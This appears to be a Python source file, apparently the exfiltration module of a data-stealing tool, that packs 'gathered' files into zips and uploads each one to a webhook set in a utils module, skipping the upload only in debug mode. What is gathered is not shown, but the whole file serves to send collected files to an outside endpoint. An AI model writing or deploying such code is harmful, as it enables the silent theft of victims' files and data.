import requests
import logging
from utils import WEBHOOK, pack_gathered, USERNAME, DEBUG_MODE


def send_file_via_webhook(file_path: str, message=USERNAME):
    with open(file_path, "rb") as file:
        requests.post(WEBHOOK, files={"file": file}, data={"content": message})


def send():
    if not DEBUG_MODE:
        zip_files = pack_gathered()
        for zip_file in zip_files:
            send_file_via_webhook(zip_file)
